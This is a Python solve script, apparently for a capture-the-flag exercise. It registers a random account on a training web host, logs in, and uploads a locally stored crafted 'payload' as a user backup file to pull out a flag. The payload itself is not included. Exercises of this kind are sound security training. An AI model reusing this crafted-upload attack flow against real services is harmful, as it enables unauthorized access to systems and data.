import requests
import string
import random
import re


url = "http://meta.training.jinblack.it"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
	if search:
		return search.group()
	  

def gen_ran_string(size=15):
	return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

def register(s, u, p):
	data = {"username": u, "password_1": p, "password_2": p, "reg_user": ""}
	return s.post(url+"/register.php", data=data).text

def login(s, u, p):
	data = {"username": u, "password": p, "log_user": ""}
	return s.post(url+"/login.php", data=data).text

def upload_file(s, fieldname, file):
	files = {fieldname: file}
	return s.post(url+"/upload_user.php", files=files).text

u = gen_ran_string()
p = gen_ran_string()
s = requests.Session()

register(s, u, p)
login(s, u, p)
# we upload a crafted user and print the flag
print(find_flag(upload_file(s, 'user_bak', ('payload', open('payload', 'rb')))))


